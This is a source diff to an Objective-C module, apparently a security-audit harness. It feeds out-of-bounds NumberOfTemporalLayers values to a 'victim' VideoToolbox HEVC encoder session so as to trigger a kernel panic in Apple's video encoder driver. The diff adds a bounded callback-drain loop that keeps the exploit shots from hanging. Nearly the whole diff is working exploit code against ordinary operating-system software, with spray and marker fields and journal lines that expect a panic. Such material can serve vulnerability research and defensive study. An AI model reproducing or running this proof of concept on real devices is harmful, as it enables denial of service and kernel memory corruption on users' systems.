@@ -12,6 +12,40 @@
 #define F_SETPIPE_SZ 73
 #endif
 
+// Hang fix (same class as H9): VTCompressionSessionCompleteFrames(kCMTimeInvalid)
+// deadlocks forever on a fault-latched session - and the path-ii shots
+// (NTL=16000/16463 in frameProperties) can latch exactly one. Bounded callback
+// drain instead, Liza semantics: sink cleared before submission, break on fault.
+static void SpriteAttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
+    if (!sink) return;
+    @synchronized (sink) {
+        [sink addObject:[NSString stringWithFormat:@"cb st=%d", (int)st]];
+    }
+}
+static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int expected, int timeoutMs) {
+    if (!s || !sink || expected <= 0) return;
+    int waited = 0, last = 0, idleMs = 0;
+    while (waited < timeoutMs) {
+        int now = 0;
+        BOOL faulted = NO;
+        @synchronized (sink) {
+            now = (int)sink.count;
+            if (now > 0) {
+                NSString *tail = [sink lastObject];
+                if (tail && ![tail hasPrefix:@"cb st=0"]) faulted = YES;
+            }
+        }
+        if (now >= expected) break;
+        if (faulted) break;
+        if (now > 0 && now == last) { idleMs += 2; if (idleMs >= 30) break; }
+        else idleMs = 0;
+        last = now;
+        usleep(2000);
+        waited += 2;
+    }
+}
+
 @interface KPAuditAVESpriteModule ()
 @property (nonatomic, assign) int sprayCount;
 @property (nonatomic, assign) uint32_t marker;
@@ -125,10 +159,11 @@
         @"AllowTemporalCompression": @YES,
     };
     VTCompressionSessionRef victim = NULL;
+    NSMutableArray *vSink = [NSMutableArray array];
     OSStatus vst = VTCompressionSessionCreate(kCFAllocatorDefault, W, H,
                                               kCMVideoCodecType_HEVC,
                                               (__bridge CFDictionaryRef)vspec, NULL, NULL,
-                                              NULL, NULL, &victim);
+                                              SpriteAttsCB, (__bridge void *)vSink, &victim);
     if (vst != noErr || !victim) {
         [report appendString:@"\nVERDICT: VICTIM_SESSION_FAILED\n"];
         return report;
@@ -272,13 +307,18 @@
     [self journal:[NSString stringWithFormat:@"BEFORE_VICTIM_ENCODE ntl=%d (panic expected; far shows the consumed bytes)", ntl]];
     if (pb) {
         // shot 0: clean IDR at legal NTL=3 (fills the encoder context)
-        VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
-        VTCompressionSessionCompleteFrames(victim, kCMTimeInvalid);
+        @synchronized (vSink) { [vSink removeAllObjects]; }
+        if (VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid,
+                                            NULL, NULL, NULL) == noErr) {
+            SpriteDrain(victim, vSink, 1, 200);
+        }
         // shot 1: path-ii - the OOB NTL in frameProperties
         NSDictionary *shot1 = @{ @"NumberOfTemporalLayers": @(ntl) };
+        @synchronized (vSink) { [vSink removeAllObjects]; }
         OSStatus s1 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(1, 30), kCMTimeInvalid,
                                                       (__bridge CFDictionaryRef)shot1, NULL, NULL);
         [report appendFormat:@"shot-ii frameProps NTL=%d -> %d\n", ntl, (int)s1];
+        if (s1 == noErr) SpriteDrain(victim, vSink, 1, 200);
         // shot 2: post-IDR session setter (no re-prepare)
         CFNumberRef sm = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
         OSStatus s2 = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), sm);
@@ -291,10 +331,11 @@
         [report appendFormat:@"shot-i post-IDR set=%d readback=%d\n", (int)s2, postV];
         // shot 3: the panic rung in frameProperties
         NSDictionary *shot3 = @{ @"NumberOfTemporalLayers": @16463 };
+        @synchronized (vSink) { [vSink removeAllObjects]; }
         OSStatus s3 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(2, 30), kCMTimeInvalid,
                                                       (__bridge CFDictionaryRef)shot3, NULL, NULL);
         [report appendFormat:@"shot-iii frameProps NTL=16463 -> %d\n", (int)s3];
-        VTCompressionSessionCompleteFrames(victim, kCMTimeInvalid);
+        if (s3 == noErr) SpriteDrain(victim, vSink, 1, 200);
     }
     [self journal:@"AFTER_VICTIM_ENCODE survived — no panic this time"];
 
